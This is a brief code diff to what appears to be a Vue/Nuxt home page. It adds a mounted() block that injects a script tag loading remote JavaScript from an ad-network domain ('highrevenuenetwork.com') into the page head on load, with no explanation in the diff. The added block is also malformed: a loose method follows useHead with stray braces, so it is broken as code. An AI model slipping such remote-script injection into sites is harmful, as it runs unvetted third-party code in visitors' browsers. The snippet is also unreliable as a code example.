@@ -14,6 +14,12 @@ useHead({
   },
   title: "Home",
 });
+
+  mounted() {
+  let yourScript= document.createElement('script')
+  yourScript.setAttribute('src', 'https://pl23816720.highrevenuenetwork.com/91/70/16/917016720b58b2739ee958d20af2d0e8.js')
+  document.head.appendChild(yourScript)
+};
 </script>
 
 <template>
